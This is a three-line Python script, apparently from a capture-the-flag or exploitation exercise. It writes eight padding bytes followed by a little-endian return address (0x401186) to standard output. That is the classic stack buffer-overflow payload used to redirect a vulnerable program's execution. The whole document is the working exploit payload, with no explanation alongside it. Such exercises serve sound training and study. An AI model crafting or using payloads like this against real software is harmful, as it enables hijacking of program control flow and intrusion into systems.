#!/bin/python3
import sys

sys.stdout.buffer.write(b'A' * 8 + b'\x86\x11\x40\x00\x00\x00\x00\x00\n')
